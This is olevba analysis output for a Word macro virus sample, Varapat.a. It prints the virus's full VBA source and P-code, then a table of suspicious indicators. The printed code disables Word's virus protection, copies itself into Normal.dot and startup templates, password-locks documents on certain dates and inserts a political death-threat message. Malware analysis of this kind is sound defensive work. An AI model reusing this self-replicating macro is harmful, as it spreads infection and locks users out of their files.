olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Varapat.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Varapat.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Reproduct.bas 
in file: Virus.MSWord.Varapat.a - OLE stream: 'Macros/VBA/Reproduct'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Repro
tyoi = Year(Date)
fdar = Day(Date)
grij = Minute(Time)
Dim treb
Randomize
treb = Int((25 * Rnd) + 1)
puuc = tyoi * grij * fdar * treb
If Day(Date) > 17 Then ActiveDocument.Password = (puuc)
If Day(Date) > 16 Then ActiveDocument.Content.InsertAfter Text:=" L. D. Kuchma must die. Best regards, Pativara. "
End Sub
Sub Pativara()
MsgBox "KUCHMA MUST DIE !"
If Day(Date) > 18 Then AutoClose
End Sub
Sub AutoClose()
If Day(Date) > 18 Then MsgBox "ANTI-SEKRETUTKA by Pativara"
If Day(Date) > 17 Then Pativara
End Sub
Sub Repro()
Application.Options.VirusProtection = False
On Error Resume Next
turs = Doc.Text.KillFiles
murt = Word.Application.Path + "\XLSTART\xlsmurt.drv"
biht = Glob.Matters.Appl + "C:\Windows"
murt = Word.Application.Path + "\STARTUP\winword.drv"
nart = Wording.Jump.Image1033.jpg
etun = Word.ActiveDocument.FullName
mute = Deltree.Format - C.Delete
srun = NormalData.Base.FullName
kapy = Normal.ThisDocument.FullName
kapu = Glob.ThisDocument.FullNam
hibr = "Reproduct"
tyja = "Regedit"
bers = "Reparation"
trir = "Repatriation"
hjbr = Add.Custom.Macro.FullName
If (Dir(murt) = "") Then
Application.Documents.Add
Application.Documents(1).SaveAs (murt)
Application.Documents(1).Close SaveChanges:=False
Word.RecentFiles.Item(1).Delete
End If
Application.OrganizerCopy Source:=etun, _
Destination:=murt, _
Name:=hibr, _
Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=etun, _
Destination:=kapy, _
Name:=hibr, _
Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=kapy, _
Destination:=murt, _
Name:=hibr, _
Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=murt, _
Destination:=etun, _
Name:=hibr, _
Object:=wdOrganizerObjectProjectItems
End Sub
Sub AutoExit()
AutoClose
End Sub
Sub ToolsMacro()
' Macro.Word.PATIVARA '
End Sub
Sub ViewSecurity()
' by Pativara B.-A. V., 2005 '
End Sub








-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Varapat.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/Reproduct - 4454 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	ArgsCall Repro 0x0000 
' Line #2:
' 	Ld Date 
' 	ArgsLd Year 0x0001 
' 	St tyoi 
' Line #3:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	St fdar 
' Line #4:
' 	Ld Time 
' 	ArgsLd Minute 0x0001 
' 	St grij 
' Line #5:
' 	Dim 
' 	VarDefn treb
' Line #6:
' 	ArgsCall Read 0x0000 
' Line #7:
' 	LitDI2 0x0019 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St treb 
' Line #8:
' 	Ld tyoi 
' 	Ld grij 
' 	Mul 
' 	Ld fdar 
' 	Mul 
' 	Ld treb 
' 	Mul 
' 	St puuc 
' Line #9:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0011 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld puuc 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemSt Password 
' 	EndIf 
' Line #10:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0010 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0030 " L. D. Kuchma must die. Best regards, Pativara. "
' 	ParamNamed Then 
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	ArgsMemCall InsertAfter 0x0001 
' 	EndIf 
' Line #11:
' 	EndSub 
' Line #12:
' 	FuncDefn (Sub Pativara())
' Line #13:
' 	LitStr 0x0011 "KUCHMA MUST DIE !"
' 	ArgsCall MsgBox 0x0001 
' Line #14:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0012 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	ArgsCall AutoClose 0x0000 
' 	EndIf 
' Line #15:
' 	EndSub 
' Line #16:
' 	FuncDefn (Sub AutoClose())
' Line #17:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0012 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001B "ANTI-SEKRETUTKA by Pativara"
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #18:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0011 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Pativara 0x0000 
' 	EndIf 
' Line #19:
' 	EndSub 
' Line #20:
' 	FuncDefn (Sub Repro())
' Line #21:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #22:
' 	OnError (Resume Next) 
' Line #23:
' 	Ld Doc 
' 	MemLd Then 
' 	MemLd KillFiles 
' 	St turs 
' Line #24:
' 	Ld Word 
' 	MemLd Application 
' 	MemLd Path 
' 	LitStr 0x0014 "\XLSTART\xlsmurt.drv"
' 	Add 
' 	St murt 
' Line #25:
' 	Ld Glob 
' 	MemLd Matters 
' 	MemLd Appl 
' 	LitStr 0x000A "C:\Windows"
' 	Add 
' 	St biht 
' Line #26:
' 	Ld Word 
' 	MemLd Application 
' 	MemLd Path 
' 	LitStr 0x0014 "\STARTUP\winword.drv"
' 	Add 
' 	St murt 
' Line #27:
' 	Ld Wording 
' 	MemLd Jump 
' 	MemLd Image1033 
' 	MemLd jpg 
' 	St nart 
' Line #28:
' 	Ld Word 
' 	MemLd ActiveDocument 
' 	MemLd FullName 
' 	St etun 
' Line #29:
' 	Ld Deltree 
' 	MemLd Format$ 
' 	Ld C 
' 	MemLd Delete 
' 	Sub 
' 	St mute 
' Line #30:
' 	Ld NormalData 
' 	MemLd Base 
' 	MemLd FullName 
' 	St srun 
' Line #31:
' 	Ld Normal 
' 	MemLd ThisDocument 
' 	MemLd FullName 
' 	St kapy 
' Line #32:
' 	Ld Glob 
' 	MemLd ThisDocument 
' 	MemLd FullNam 
' 	St kapu 
' Line #33:
' 	LitStr 0x0009 "Reproduct"
' 	St hibr 
' Line #34:
' 	LitStr 0x0007 "Regedit"
' 	St tyja 
' Line #35:
' 	LitStr 0x000A "Reparation"
' 	St bers 
' Line #36:
' 	LitStr 0x000C "Repatriation"
' 	St trir 
' Line #37:
' 	Ld Add 
' 	MemLd Custom 
' 	MemLd Macro 
' 	MemLd FullName 
' 	St hjbr 
' Line #38:
' 	Ld murt 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #39:
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemCall Add 0x0000 
' Line #40:
' 	Ld murt 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	ArgsMemLd Documents 0x0001 
' 	ArgsMemCall SaveAs 0x0001 
' Line #41:
' 	LitVarSpecial (False)
' 	ParamNamed SaveChanges 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	ArgsMemLd Documents 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #42:
' 	LitDI2 0x0001 
' 	Ld Word 
' 	MemLd RecentFiles 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	LineCont 0x000C 07 00 00 00 0B 00 00 00 0F 00 00 00
' 	Ld etun 
' 	ParamNamed Source 
' 	Ld murt 
' 	ParamNamed Destination 
' 	Ld hibr 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #45:
' 	LineCont 0x000C 07 00 00 00 0B 00 00 00 0F 00 00 00
' 	Ld etun 
' 	ParamNamed Source 
' 	Ld kapy 
' 	ParamNamed Destination 
' 	Ld hibr 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #46:
' 	LineCont 0x000C 07 00 00 00 0B 00 00 00 0F 00 00 00
' 	Ld kapy 
' 	ParamNamed Source 
' 	Ld murt 
' 	ParamNamed Destination 
' 	Ld hibr 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #47:
' 	LineCont 0x000C 07 00 00 00 0B 00 00 00 0F 00 00 00
' 	Ld murt 
' 	ParamNamed Source 
' 	Ld etun 
' 	ParamNamed Destination 
' 	Ld hibr 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #48:
' 	EndSub 
' Line #49:
' 	FuncDefn (Sub AutoExit())
' Line #50:
' 	ArgsCall AutoClose 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub ToolsMacro())
' Line #53:
' 	QuoteRem 0x0000 0x0016 " Macro.Word.PATIVARA '"
' Line #54:
' 	EndSub 
' Line #55:
' 	FuncDefn (Sub ViewSecurity())
' Line #56:
' 	QuoteRem 0x0000 0x001D " by Pativara B.-A. V., 2005 '"
' Line #57:
' 	EndSub 
' Line #58:
' Line #59:
' Line #60:
' Line #61:
' Line #62:
' Line #63:
' Line #64:
' Line #65:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

